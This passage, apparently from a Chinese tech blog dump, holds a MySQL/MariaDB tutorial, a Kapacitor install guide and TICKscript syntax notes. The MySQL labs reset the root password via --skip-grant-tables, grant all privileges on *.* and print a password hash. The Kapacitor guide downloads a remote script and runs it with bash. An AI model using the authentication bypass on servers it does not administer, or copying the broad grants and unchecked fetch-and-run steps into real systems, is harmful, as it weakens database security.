外)都可以有符号或无符号。有符号数值列可以存储正或负的数值,无符号数值列只能存储正数。默认情况为有符号,但如果你知道自己不需要存储负值,可以使用 UNSIGNED 关键字,这样做将允许你存储两倍大小的值。 数值数据类型 说明 BIT 位字段,1~64位。(在MySQL 5之前,BIT在功能上等价于TINYINT BIGINT 整数值,支持92233720368547758089223372036854775807(如果是UNSIGNED,为018446744073709551615)的数 BOOLEAN(或BOOL) 布尔标志,或者为0或者为1,主要用于开/关(on/off)标志 DECIMAL(或DEC) 精度可变的浮点值 DOUBLE 双精度浮点值 FLOAT 单精度浮点值 INT(或INTEGER) 整数值,支持21474836482147483647 (如果是UNSIGNED,为04294967295)的数 MEDIUMINT 整数值,支持83886088388607(如果是UNSIGNED,为016777215)的数 REAL 4字节的浮点值 SMALLINT 整数值,支持3276832767(如果是UNSIGNED,为065535)的数 TINYINT 整数值,支持128127(如果为UNSIGNED,为0255)的数 不使用引号 与串不一样,数值不应该括在引号内。 存储货币数据类型 MySQL中没有专门存储货币的数据类型,一般情况下使用 DECIMAL(8, 2) 日期和时间数据类型 MySQL使用专门的数据类型来存储日期和时间值。见下表。 日期和时间数据类型 说明 DATE 表示1000-01-01~9999-12-31的日期,格式为YYYY-MM-DD DATETIME DATE和TIME的组合 TIMESTAMP 功能和DATETIME相同(但范围较小) TIME 格式为HH:MM:SS YEAR 用2位数字表示,范围是70(1970年)69(2069年),用4位数字表示,范围是1901年2155年 二进制数据类型 二进制数据类型可存储任何数据(甚至包括二进制信息),如图像、多媒体、字处理文档等(见下表）。 二进制数据类型 说明 BLOB Blob最大长度为64 KB MEDIUMBLOB Blob最大长度为16 MB LONGBLOB Blob最大长度为4 GB TINYBLOB Blob最大长度为255字节 实战项目 实战项目1:熟悉SQL语句根据下面的表格练习sql语句（书店的库存数据库） 在该表格中,编号、书名、作者、进货日期、价格、数量就是不同的列,而每一行保存的则是具体的数据。 建立一个名字为 bookshop 的库,在这个库中建立一张关于书籍库存名字为 reserve 的表,表的结构如图所示。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136[root@serverg ~]# mysql -uroot -pEnter password:Welcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 2Server version: 5.5.41-MariaDB MariaDB ServerCopyright (c) 2000, 2014, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.#显示库MariaDB [(none)]&gt; show databases;+--------------------+| Database|+--------------------+| information_schema || mysql|| performance_schema || test|+--------------------+4 rows in set (0.00 sec)#建库MariaDB [(none)]&gt; create database db1;Query OK, 1 row affected (0.00 sec)#使用库MariaDB [(none)]&gt; use db1;Database changed#删除库MariaDB [db1]&gt; drop database db1;Query OK, 0 rows affected (0.02 sec)MariaDB [(none)]&gt; create database booboo;Query OK, 1 row affected (0.00 sec)#使用库MariaDB [(none)]&gt; use booboo;Database changed#建表MariaDB [booboo]&gt; create table bookshop (-&gt; id int primary key,列名为 id 整数型 主建-&gt; bookname varchar(50) not null,列名为 bookname 可变长度字符类型最长为 50 字节 不为空-&gt; writer varchar(50),列名为 writer 可变长度字符类型最长为 50 字节-&gt; bookdate date,列名为 bookdate 日期型-&gt; price float,列名为 price 浮点型-&gt; amount int列名为 amount 整数型-&gt; );Query OK, 0 rows affected (0.05 sec)#显示表MariaDB [booboo]&gt; show tables ;+------------------+| Tables_in_booboo |+------------------+| bookshop|+------------------+1 row in set (0.00 sec)#插入表数据MariaDB [booboo]&gt; insert into bookshop values (1,&quot;Live with Linux&quot;,&quot;Tube&quot;,&quot;2007-1-25&quot;,75.00,50);Query OK, 1 row affected (0.01 sec)MariaDB [booboo]&gt; insert into bookshop values (2,&quot;Linux inside&quot;,&quot;Kevin&quot;,&quot;2008-2-15&quot;,83.00,50)-&gt; ;Query OK, 1 row affected (0.06 sec)MariaDB [booboo]&gt; insert into bookshop values-&gt; (3,&quot;L.A.M.P&quot;,&quot;Tom&quot;,&quot;2008-2-5&quot;,82.5,50),-&gt; (4,&quot;My way&quot;,&quot;Jam&quot;,&quot;2007-12-3&quot;,45.25,130),-&gt; (5,&quot;Open your heart&quot;,&quot;July&quot;,&quot;2007-3-8&quot;,35,20),-&gt; (6,&quot;Pro C&quot;,&quot;Todd&quot;,&quot;2007-8-25&quot;,85,25),-&gt; (7,&quot;Thinking in C&quot;,&quot;John&quot;,&quot;2006-6-13&quot;,65,30);Query OK, 5 rows affected (0.03 sec)Records: 5 Duplicates: 0 Warnings: 0#显示表数据MariaDB [booboo]&gt; select * from bookshop;+----+-----------------+--------+------------+-------+--------+| id | bookname| writer | bookdate | price | amount |+----+-----------------+--------+------------+-------+--------+| 1 | Live with Linux | Tube | 2007-01-25 | 75 | 50 || 2 | Linux inside | Kevin | 2008-02-15 | 83 | 50 || 3 | L.A.M.P| Tom | 2008-02-05 | 82.5 | 50 || 4 | My way| Jam | 2007-12-03 | 45.25 | 130 || 5 | Open your heart | July | 2007-03-08 | 35 | 20 || 6 | Pro C| Todd | 2007-08-25 | 85 | 25 || 7 | Thinking in C | John | 2006-06-13 | 65 | 30 |+----+-----------------+--------+------------+-------+--------+7 rows in set (0.00 sec)#查询表数据MariaDB [booboo]&gt; select bookname,writer from bookshop where id=4;+----------+--------+| bookname | writer |+----------+--------+| My way | Jam |+----------+--------+1 row in set (0.00 sec)MariaDB [booboo]&gt; select bookname,writer from bookshop where id=4 or id=5;+-----------------+--------+| bookname| writer |+-----------------+--------+| My way| Jam || Open your heart | July |+-----------------+--------+2 rows in set (0.00 sec)#修改表数据MariaDB [booboo]&gt; update bookshop set-&gt; writer=&quot;booboo&quot;-&gt; where id=1;Query OK, 1 row affected (0.04 sec)Rows matched: 1 Changed: 1 Warnings: 0#删除表数据MariaDB [booboo]&gt; delete from bookshop where id=7;Query OK, 1 row affected (0.02 sec)MariaDB [booboo]&gt; select * from bookshop;+----+-----------------+--------+------------+-------+--------+| id | bookname| writer | bookdate | price | amount |+----+-----------------+--------+------------+-------+--------+| 1 | Live with Linux | booboo | 2007-01-25 | 75 | 50 || 2 | Linux inside | Kevin | 2008-02-15 | 83 | 50 || 3 | L.A.M.P| Tom | 2008-02-05 | 82.5 | 50 || 4 | My way| Jam | 2007-12-03 | 45.25 | 130 || 5 | Open your heart | July | 2007-03-08 | 35 | 20 || 6 | Pro C| Todd | 2007-08-25 | 85 | 25 |+----+-----------------+--------+------------+-------+--------+6 rows in set (0.00 sec) 实战项目2:熟悉mysql.user表 查看mysql库中user表中的host,user,password列的值； 删除mysql库中的user表中，user列为空或者password列为空的行； 1234567891011121314151617181920212223MariaDB [mysql]&gt; select host,user,password from mysql.user;+----------------------+------+-------------------------------------------+| host | user | password |+----------------------+------+-------------------------------------------+| localhost | root | *6FF883623B8639D08083FF411D20E6856EB7D2BF || mastera0.example.com | root | || 127.0.0.1 | root | || ::1 | root | || localhost | | || mastera0.example.com | | |+----------------------+------+-------------------------------------------+6 rows in set (0.00 sec)MariaDB [mysql]&gt; delete from mysql.user where user=&apos; &apos; or password=&apos; &apos;;Query OK, 5 rows affected (0.00 sec)MariaDB [mysql]&gt; select host,user,password from mysql.user;+-----------+------+-------------------------------------------+| host | user | password |+-----------+------+-------------------------------------------+| localhost | root | *6FF883623B8639D08083FF411D20E6856EB7D2BF |+-----------+------+-------------------------------------------+1 row in set (0.00 sec) 实战项目3：完成数据库用户权限操作项目 要求:添加授权用户测试客户机优先使用的哪个密码(X为学生机号) user1@’172.25.X.%’ uplooking user1@’172.25.X.12’ uplooking123 123456789101112131415161718192021222324# mastera:MariaDB [mysql]&gt; grant all on *.* to user1@&quot;172.25.0.%&quot; identified by &quot;uplooking&quot;;Query OK, 0 rows affected (0.00 sec)MariaDB [mysql]&gt; grant all on *.* to user1@&quot;172.25.0.12&quot; identified by &quot;uplooking123&quot;;Query OK, 0 rows affected (0.00 sec)MariaDB [mysql]&gt; flush privileges;Query OK, 0 rows affected (0.01 sec)MariaDB [mysql]&gt; \\qBye# masterb:# 第一次输入密码为: uplooking[root@serverb ~]# mysql -uuser1 -h172.25.0.11 -p&apos;uplooking&apos;ERROR 1045 (28000): Access denied for user &apos;user1&apos;@&apos;mastera0.example.com&apos; (using password:YES)#第二次输入密码为:uplooking123[root@serverb ~]# mysql -uuser1 -h172.25.0.11 -p&apos;uplooking123&apos;Welcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 7Server version: 5.5.41-MariaDB MariaDB ServerCopyright (c) 2000, 2014, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt;实验结论:uplooking2 密码进去了 授权越精确越优先 实战项目4: 破解 MariaDB 5.5 的 root 密码 停止服务 systemctl stop mariadb 跳过授权表启动服务 mysqld_safe --skip-grant-tables &amp; 修改root密码 update mysql.user set password=password(&apos;uplooking&apos;) where user=&apos;root&apos;; 停止跳过授权表启动服务 kill -9 启动服务 systemctl start mariadb 123456789101112131415161718192021222324252627282930313233343536373839404142# rhel7 mariadb5.5[root@serverg ~]# systemctl stop mariadb[root@serverg ~]# mysqld_safe --skip-grant-tables &amp;[1] 3078[root@serverg ~]# 160304 18:36:15 mysqld_safe Logging to &apos;/var/log/mariadb/mariadb.log&apos;.160304 18:36:15 mysqld_safe Starting mysqld daemon with databases from /var/lib/mysql[root@serverg ~]# mysql -uxxxWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 1Server version: 5.5.41-MariaDB MariaDB ServerCopyright (c) 2000, 2014, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; use mysql;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMariaDB [mysql]&gt; update user set password=password(&quot;redhat&quot;) where user=&quot;root&quot; andhost=&quot;localhost&quot;;Query OK, 1 row affected (0.00 sec)Rows matched: 1 Changed: 1 Warnings: 0MariaDB [mysql]&gt; \\qBye[root@serverg ~]# ps -ef |grep mysqlmysql32211 0 18:36 ?00:00:00 /usr/libexec/mysqld --basedir=/usr--datadir=/var/lib/mysql --plugin-dir=/usr/lib64/mysql/plugin --user=mysql --skip-grant-tables --log-error=/var/log/mariadb/mariadb.log--pid-file=/var/run/mariadb/mariadb.pid--socket=/var/lib/mysql/mysql.sockroot3287 3256 0 18:40 pts/0 00:00:00 grep --color=auto mysql[root@serverg ~]# kill -9 3221[root@serverg ~]# systemctl start mariadb[root@serverg ~]# mysql -uroot -predhatWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 3Server version: 5.5.41-MariaDB MariaDB ServerCopyright (c) 2000, 2014, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; 总结本章要求掌握sql语句的基本用法，包括create database,create table,drop database,drop table,insert into,update,delete from,grant,revoke;其他sql语句作为拓展。","link":"/2016/12/28/booboo_mysql/02-SQL02/"},{"title":"01-Kapacitor安装-CentOS 7 安装TICK技术栈","text":"通过安装脚本一键安装 通过yum源手动安装 Kapacitor文件 进程和监听端口 No. 功能 应用 服务器 1 数据采集 Telegraf ECS 2 时序数据库 InfluxDB ECS 3 监控展示 Chronograf ECS 4 告警通知 kapacitor ECS 通过安装脚本一键安装1234wget https://raw.githubusercontent.com/BoobooWei/booboo_TimeSeriesDBMS/master/scripts/auto_install_influxdb1.7.shbash auto_install_influxdb1.7.shwget https://raw.githubusercontent.com/BoobooWei/booboo_TimeSeriesDBMS/master/scripts/myinfluxdb1.7ctl.shbash myinfluxdb1.7ctl.sh all start 通过yum源手动安装 123456789101112# set repocat &gt; /etc/yum.repos.d/influxdb.repo &lt;&lt; ENDF[influxdb]name = InfluxDB Repository - RHEL \\$releaseverbaseurl = https://repos.influxdata.com/rhel/\\$releasever/\\$basearch/stableenabled = 1gpgcheck = 1gpgkey = https://repos.influxdata.com/influxdb.keyENDFyum install -y telegraf influxdb chronograf kapacitorchown telegraf. /var/log/telegraf -R Kapacitor文件 文件 说明 /etc/kapacitor/kapacitor.conf 配置文件 /etc/logrotate.d/kapacitor 日志轮询配置 /usr/bin/kapacitor 客户端 /usr/bin/tickfmt 格式化TICKscript /usr/bin/kapacitord 守护进程Daemon /usr/lib/kapacitor/scripts/kapacitor.service Service /var/lib/kapacitor 数据目录 /var/log/kapacitor 日志目录 进程和监听端口默认监听端口9092 12345[root@node1 ~]# ps -ef|grep kapacitorroot 513 453 0 09:22 pts/0 00:00:00 grep --color=auto kapacitorkapacit+ 1024 1 0 8月15 ? 00:00:08 /usr/bin/kapacitord -config /etc/kapacitor/kapacitor.conf[root@node1 ~]# ss -luntp|grep kapacitortcp LISTEN 0 128 :::9092 :::* users:((&quot;kapacitord&quot;,1024,8))","link":"/2020/04/14/booboo_tick/kapacitor/01_Kapacitor%E5%AE%89%E8%A3%85/CentOS7%E5%AE%89%E8%A3%85TICK%E6%8A%80%E6%9C%AF%E6%A0%88/"},{"title":"02-TICKscript语言-A-基础语法和运算符","text":"TICKscript 语法 介绍 符号 语法 关键字 运算符 链接运算符 TICKscript 语法介绍TICKscript语言是一种用于定义数据处理管道的调用链语言。 符号使用Extended Backus-Naur Form（“EBNF”）指定语法。EBNF与Go编程语言规范中使用的符号相同，可在此处找到。 1234567Production = production_name &quot;=&quot; [ Expression ] &quot;.&quot; .Expression = Alternative { &quot;|&quot; Alternative } .Alternative = Term { Term } .Term = production_name | token [ &quot;…&quot; token ] | Group | Option | Repetition .Group = &quot;(&quot; Expression &quot;)&quot; .Option = &quot;[&quot; Expression &quot;]&quot; .Repetition = &quot;{&quot; Expression &quot;}&quot; . 符号运算符按优先顺序排列： 1234| alternation() grouping[] option (0 or 1 times){} repetition (0 to n times) 语法以下是TICKscript的EBNF语法定义。 1234567891011121314151617181920212223242526272829303132333435unicode_char = (* an arbitrary Unicode code point except newline *) .digit = &quot;0&quot; … &quot;9&quot; .ascii_letter = &quot;A&quot; … &quot;Z&quot; | &quot;a&quot; … &quot;z&quot; .letter = ascii_letter | &quot;_&quot; .identifier = ( letter ) { letter | digit } .boolean_lit = &quot;TRUE&quot; | &quot;FALSE&quot; .int_lit = &quot;1&quot; … &quot;9&quot; { digit }letter = ascii_letter | &quot;_&quot; .number_lit = digit { digit } { &quot;.&quot; {digit} } .duration_lit = int_lit duration_unit .duration_unit = &quot;u&quot; | &quot;µ&quot; | &quot;ms&quot; | &quot;s&quot; | &quot;m&quot; | &quot;h&quot; | &quot;d&quot; | &quot;w&quot; .string_lit = `&apos;` { unicode_char } `&apos;` .star_lit = &quot;*&quot;regex_lit = `/` { unicode_char } `/` .operator_lit = &quot;+&quot; | &quot;-&quot; | &quot;*&quot; | &quot;/&quot; | &quot;==&quot; | &quot;!=&quot; | &quot;&lt;&quot; | &quot;&lt;=&quot; | &quot;&gt;&quot; | &quot;&gt;=&quot; | &quot;=~&quot; | &quot;!~&quot; | &quot;AND&quot; | &quot;OR&quot; .Program = Statement { Statement } .Statement = Declaration | Expression .Declaration = &quot;var&quot; identifier &quot;=&quot; Expression .Expression = identifier { Chain } | Function { Chain } | Primary .Chain = &quot;@&quot; Function | &quot;|&quot; Function { Chain } | &quot;.&quot; Function { Chain} | &quot;.&quot; identifier { Chain } .Function = identifier &quot;(&quot; Parameters &quot;)&quot; .Parameters = { Parameter &quot;,&quot; } [ Parameter ] .Parameter = Expression | &quot;lambda:&quot; LambdaExpr | Primary .Primary = &quot;(&quot; LambdaExpr &quot;)&quot; | number_lit | string_lit | boolean_lit | duration_lit | regex_lit | star_lit | LFunc | identifier | Reference | &quot;-&quot; Primary | &quot;!&quot; Primary .Reference = `&quot;` { unicode_char } `&quot;` .LambdaExpr = Primary operator_lit Primary .LFunc = identifier &quot;(&quot; LParameters &quot;)&quot;LParameters = { LParameter &quot;,&quot; } [ LParameter ] .LParameter = LambdaExpr | Primary . 注释：通过//实现 关键字 Word Usage TRUE The literal Boolean value “true”. FALSE The literal Boolean value “false”. AND 与 OR 或 lambda: lambda表达式 var 变量声明 dbrp 数据库声明 运算符 Operator Usage Examples + 加法和字符串连接 3 + 6, total + count and &apos;foo&apos; + &apos;bar&apos; - 减法 10 - 1, total - errs ***** 乘法 3 * 6, ratio * 100.0 / 除法 36 / 4, errs / total == 等值判断 1 == 1, date == today != 不等于判断 result != 0, id != &quot;testbed&quot; &lt; 小于判断 4 &lt; 5, timestamp &lt; today &lt;= 小于等于判断 3 &lt;= 6, flow &lt;= mean &gt; 大于判断 6 &gt; 3.0, delta &gt; sigma &gt;= 大于等于判断 9.0 &gt;= 8.1, quantity &gt;= threshold =~ 正则匹配判断 tag =~ /^cz\\d+/ !~ 正则不匹配判断 tag !~ /^sn\\d+/ ! 逻辑否定 !TRUE, !(cpu_idle &gt; 70) AND 逻辑与 rate &lt; 20.0 AND rate &gt;= 10 OR 逻辑或 status &gt; warn OR delta &gt; sigma 链接运算符 操作符 用法 例子 | 声明一个链接方法调用，它创建一个新节点的实例并将其链接到它上面的节点。 stream . 声明属性方法调用，设置或更改它所属的节点中的内部属性。 from() .database(mydb) @ 声明用户定义的函数（UDF）调用。本质上是一种链接方法，它将新的UDF节点添加到管道中。 from() ... @MyFunc()","link":"/2020/04/14/booboo_tick/kapacitor/02_TICKscript%E8%AF%AD%E8%A8%80/A_TICKscript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E5%92%8C%E8%BF%90%E7%AE%97%E7%AC%A6/"},{"title":"02-TICKscript语言-C-变量声明","text":"TICKscript 变量声明 语句 变量声明 布尔值声明 字符串声明 整数声明 浮点型声明 持续时间声明 字符串列表 正则表达式声明 lambda表达式声明 节点声明 TICKscript 变量声明语句TICKscript中有两种类型的语句：声明和表达式。 声明可以声明变量或数据库； 表达式表示方法调用的管道（又称链），它创建处理节点并设置其属性。 变量声明布尔值声明 布尔值必须为大写 12var is_true = TRUEvar is_false = FALSE 字符串声明 字符串定义：单引号和三引号 12345var db = &apos;telegraf&apos;var rp = &apos;autogen&apos;var name = &apos;booboo&apos;var idName = name + &apos;wei&apos;var query = &apos;&apos;&apos;select host from telegraf.autogen where cpu=&apos;total&apos; &apos;&apos;&apos; 整数声明1var int_num = 1 浮点型声明1var float_num = 1.1 持续时间声明1var period = 5m 字符串列表1var cpu_groups = [ &apos;host&apos;, &apos;cpu&apos; ] 正则表达式声明1234var cz_turbines = /^cz\\d+/var adr_senegal = /\\.sn$/var local_ips = /^192\\.168\\..*/var locals = lambda: &quot;192.168.1.1&quot; =~ local_ips lambda表达式声明 Lambda表达式始终对点数据进行操作; 它可以包装布尔表达式，数学表达式，对内部函数的调用或这三者的组合 12345678910111213141516var my_lambda = lambda: 1 &gt; 0var lazy_lambda = lambda: &quot;usage_idle&quot; &lt; 95...var data = stream |from()...var alert = data |eval(lambda: sigma(&quot;stat&quot;)) .as(&apos;sigma&apos;) .keep() |alert() .id(&apos;{{ index .Tags &quot;host&quot;}}/cpu_used&apos;) .message(&apos;{{ .ID }}:{{ index .Fields &quot;stat&quot; }}&apos;) .info(lambda: &quot;stat&quot; &gt; 70 OR &quot;sigma&quot; &gt; 2.5) .warn(lambda: &quot;stat&quot; &gt; 80 OR &quot;sigma&quot; &gt; 3.0) .crit(lambda: &quot;stat&quot; &gt; 90 OR &quot;sigma&quot; &gt; 3.5) 节点声明节点表达式： 12345678910111213141516171819202122var data = stream |from() .database(&apos;telegraf&apos;) .retentionPolicy(&apos;autogen&apos;) .measurement(&apos;cpu&apos;) .groupBy(&apos;host&apos;) .where(lambda: &quot;cpu&quot; == &apos;cpu-total&apos;) |eval(lambda: 100.0 - &quot;usage_idle&quot;) .as(&apos;used&apos;) |window() .period(span) .every(frequency) |mean(&apos;used&apos;) .as(&apos;stat&apos;)...var alert = data |eval(lambda: sigma(&quot;stat&quot;)) .as(&apos;sigma&apos;) .keep() |alert() .id(&apos;{{ index .Tags &quot;host&quot;}}/cpu_used&apos;)... 在第一部分中，创建了五个节点: stream --&gt; from --&gt; eval --&gt; window --&gt; mean 顶级节点stream分配给变量data; stream节点通过管道将数据输送到from节点，后续一次是eval，window和mean节点。 在第二部分中，创建了两个节点： eval --&gt; alert 声明变量alert，将data赋值给alert； 通过管道将数据输送到eval节点，后续是alert节点。","link":"/2020/04/14/booboo_tick/kapacitor/02_TICKscript%E8%AF%AD%E8%A8%80/C_TICKscript%E5%8F%98%E9%87%8F%E5%A3%B0%E6%98%8E/"},{"title":"02-TICKscript语言-D-数据库声明","text":"TICKscript数据库声明 语法 注意 TICKscript数据库声明语法例22 - 数据库声明 1dbrp &quot;telegraf&quot;.&quot;autogen&quot; 示例22声明TICKscript将用于其数据库telegraf及其保留策略autogen。 注意数据库声明关键字dbrp，随后是用句点分隔两个字符串。 第一个字符串声明默认数据库，将使用该数据库。 第二个字符串声明其保留策略。 该语句为可选 如果使用则为脚本的第一个声明 请注意，在命令行上使用命令-dbrp定义任务时，也可以使用kapacitor define标志声明数据库和保留策略。","link":"/2020/04/14/booboo_tick/kapacitor/02_TICKscript%E8%AF%AD%E8%A8%80/D_TICKscript%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A3%B0%E6%98%8E/"},{"title":"02-TICKscript语言-B-数据类型","text":"TICKscript 数据类型 布尔值 Booleans 数字型 Int64 AND Float64 持续时间 Duration 字符串 字符串模板 字符串列表 正则表达式 Lambda表达式- [节点](#节点) 数据类型转换 TICKscript 数据类型TICKscript包含9种数据类型。 类型 说明 Booleans 布尔值 TRUE、FALSE String 字符串 Int64 整型 Float64 浮点型 Duration 持续时间 String Lists 字符串列表 Regular expressions 正则表达式 Lambda expressions Lambda表达式 Nodes 节点 布尔值 Booleans使用布尔关键字生成布尔值：TRUE和FALSE。请注意，这些关键字使用全部大写字母。使用小写字符时，解析器将抛出错误，例如True或true。 示例3 - 布尔值123456var true_bool = TRUE... |flatten() .on(&apos;host&apos;,&apos;port&apos;) .dropOriginalFieldName(FALSE)... 在上面的示例3中，第一行显示了使用布尔值的简单赋值。第二个示例显示FALSE在方法调用中使用布尔值。 数字型 Int64 AND Float64任何只包含数字和可选的小数的文字标记都将导致生成数字类型的实例。TICKscript了解基于Go的两种数字类型：int64和float64。任何包含小数点的数字标记都将导致创建float64值。任何以不包含小数点结束的数字标记都将导致创建int64值。如果整数以零字符为前缀0，则将其解释为八进制。 例4 - 数字型1234var my_int = 6var my_float = 2.71828var my_octal = 0400... 在例4中my_int的类型的int64，my_float是类型float64和my_octal类型为int64八进制。 持续时间 Duration持续时间文字定义了一段时间。它们的语法遵循InfluxQL中的相同语法。持续时间文字由两部分组成：整数和持续时间单位。它本质上是一个由一个或一对保留字符终止的整数，表示一个时间单位。 下表显示了用于声明持续时间类型的时间单位。 表5 - 持续时间单位 单元 含义 u or μ 微秒（百万分之一秒） ms 毫秒（千分之一秒） s 秒 m 分钟 H 小时 d 天 w 周 示例5 - 持续时间表达式123456789var span = 10svar frequency = 10s...var views = batch |query(&apos;SELECT sum(value) FROM &quot;pages&quot;.&quot;default&quot;.views&apos;) .period(1h) .every(1h) .groupBy(time(1m), *) .fill(0) 在上面的示例5中，前两行显示了Duration类型的声明。第一个表示10秒的时间跨度，第二个表示10秒的时间范围。最后一个示例显示直接在方法调用中声明持续时间。 字符串字符串以一个或三个单引号开头：&apos;或&apos;&apos;&apos;。可以使用加法+运算符连接字符串。若要转义由单引号分隔的字符串中的引号，请使用反斜杠字符\\。如果要预期在字符串中将遇到许多单引号，请使用三个单引号来分隔它。由三引号分隔的字符串不需要转义序列。在两个字符串分界情况下，可以使用双引号（用于访问字段和标记值）而无需转义。 例6 - 基本字符串12345678var region1 = &apos;EMEA&apos;var old_standby = &apos;foo&apos; + &apos;bar&apos;var query1 = &apos;SELECT 100 - mean(usage_idle) AS stat FROM &quot;telegraf&quot;.&quot;autogen&quot;.&quot;cpu&quot; WHERE cpu = \\&apos;cpu-total\\&apos; &apos;var query2 = &apos;&apos;&apos;SELECT 100 - mean(usage_idle) AS stat FROM &quot;telegraf&quot;.&quot;autogen&quot;.&quot;cpu&quot; WHERE cpu = &apos;cpu-total&apos; &apos;&apos;&apos;...batch |query(&apos;&apos;&apos;SELECT 100 - mean(usage_idle) AS stat FROM &quot;telegraf&quot;.&quot;autogen&quot;.&quot;cpu&quot; WHERE cpu = &apos;cpu-total&apos; &apos;&apos;&apos;)... 在上面的示例6中，第一行显示了使用字符串文字的简单字符串赋值。第二行使用连接运算符。第三行和第四行显示了使用和不使用内部转义单引号来声明复杂字符串文字的两种不同方法。最后一个示例显示了在方法调用中直接使用字符串文字。 要制作长复杂字符串，字符串中允许使用更易读的换行符。 例7 - 多行字符串123456batch |query(&apos;SELECT 100 - mean(usage_idle) AS stat FROM &quot;telegraf&quot;.&quot;autogen&quot;.&quot;cpu&quot; WHERE cpu = \\&apos;cpu-total\\&apos; &apos;) 在上面的示例7中，字符串被分解以使查询更容易理解。 字符串模板字符串模板允许将节点属性，标记和字段添加到字符串中。 格式遵循Go text.template 包提供的相同格式。 这在编写警报消息时很有用。 要将属性，标记或字段值添加到字符串模板，需要将其包装在双花括号内。 示例8 - 字符串模板内的变量123|alert() .id(&apos;{{ index .Tags &quot;host&quot;}}/mem_used&apos;) .message(&apos;{{ .ID }}:{{ index .Fields &quot;stat&quot; }}&apos;) 在示例8中，将三个值添加到两个字符串模板中。在对setter的调用id()中，标记的值&quot;host&quot;被添加到字符串的开头。message()然后对setter的调用会添加id字段的值，然后再添加字段的值&quot;stat&quot;。 字符串模板当前适用于Alert节点，将在下面的“ 访问字符串模板中的值 ”一节中进一步讨论。 字符串模板还可以包括流语句if...else，以及对内部格式化方法的调用。 1.message(&apos;{{ .ID }} is {{ if eq .Level &quot;OK&quot; }}alive{{ else }}dead{{ end }}: {{ index .Fields &quot;emitted&quot; | printf &quot;%0.3f&quot; }} points/10s.&apos;) 字符串列表字符串列表是在两个括号之间声明的字符串的集合。可以使用文字，其他变量的标识符或星号通配符“*”声明它们。它们可以传递给采用多个字符串参数的方法。它们在模板任务中特别有用。请注意，在函数调用中使用时，列表内容会爆炸，元素将用作函数的所有参数。给出列表时，可以理解列表包含函数的所有参数。 示例9 - 标准任务中的字符串列表12345678910var foo = &apos;foo&apos;var bar = &apos;bar&apos;var foobar_list = [foo, bar]var cpu_groups = [ &apos;host&apos;, &apos;cpu&apos; ]...stream |from() .measurement(&apos;cpu&apos;) .groupBy(cpu_groups)... 例9声明了两个字符串列表。第一个包含其他变量的标识符。第二个包含字符串文字。该列表cpu_groups用于该方法from.groupBy()。 示例10 - 模板任务中的字符串列表12345678910111213141516171819202122232425dbrp &quot;telegaf&quot;.&quot;not_autogen&quot;var measurement stringvar where_filter = lambda: TRUEvar groups = [*]var field stringvar warn lambdavar crit lambdavar window = 5mvar slack_channel = &apos;#alerts&apos;stream |from() .measurement(measurement) .where(where_filter) .groupBy(groups) |window() .period(window) .every(window) |mean(field) |alert() .warn(warn) .crit(crit) .slack() .channel(slack_channel) 示例10取自代码库中的示例，定义implicit_template.tick。它使用groups列表来保存要传递给from.groupBy()方法的变量参数。groups当模板用于创建新任务时，将确定列表的内容。 正则表达式正则表达式以正斜杠开头和结尾：/。正则表达式语法与Perl，Python和其他语言相同。有关语法的详细信息，请参阅Go 正则表达式库。 例11 - 正则表达式12345678910111213var cz_turbines = /^cz\\d+/var adr_senegal = /\\.sn$/var local_ips = /^192\\.168\\..*/...var locals = stream |from() .measurement(&apos;responses&apos;) .where(lambda: &quot;node&quot; =~ local_ips )var south_afr = stream |from() .measurement(&apos;responses&apos;) .where(lambda: &quot;dns_node&quot; =~ /\\.za$/ ) 在例11中，前三行显示了正则表达式对变量的赋值。的locals流使用分配给该变量的正则表达式local_ips。该south_afr流使用正则表达式比较，该正则表达式与字面上声明的正则表达式一起作为lambda表达式的一部分。 Lambda表达式lambda表达式是一个参数，表示要传递给方法调用或保存在变量中的简短易理解函数。它可以包装布尔表达式，数学表达式，对内部函数的调用或这三者的组合。Lambda表达式始终对点数据进行操作。它们通常是紧凑的，因此用作文字，最终传递给节点方法。可以在Lambda表达式中使用的内部函数将在下面的类型转换和Lambda表达式一节中讨论。Lambda表达式在Lambda表达式主题中详细介绍。 Lambda表达式以令牌开头，lambda后跟冒号： - lambda:。 例12- Lambda表达式12345678910111213141516var my_lambda = lambda: 1 &gt; 0var lazy_lambda = lambda: &quot;usage_idle&quot; &lt; 95...var data = stream |from()...var alert = data |eval(lambda: sigma(&quot;stat&quot;)) .as(&apos;sigma&apos;) .keep() |alert() .id(&apos;{{ index .Tags &quot;host&quot;}}/cpu_used&apos;) .message(&apos;{{ .ID }}:{{ index .Fields &quot;stat&quot; }}&apos;) .info(lambda: &quot;stat&quot; &gt; 70 OR &quot;sigma&quot; &gt; 2.5) .warn(lambda: &quot;stat&quot; &gt; 80 OR &quot;sigma&quot; &gt; 3.0) .crit(lambda: &quot;stat&quot; &gt; 90 OR &quot;sigma&quot; &gt; 3.5) 上面的例12表明lambda表达式可以直接赋值给变量。在eval节点中，使用lambda语句调用sigma函数。警报节点使用lambda表达式来定义给定事件的日志级别。 节点与更简单的类型一样，节点类型已声明，可以分配给变量。 例13 - 节点表达式12345678910111213141516171819202122var data = stream |from() .database(&apos;telegraf&apos;) .retentionPolicy(&apos;autogen&apos;) .measurement(&apos;cpu&apos;) .groupBy(&apos;host&apos;) .where(lambda: &quot;cpu&quot; == &apos;cpu-total&apos;) |eval(lambda: 100.0 - 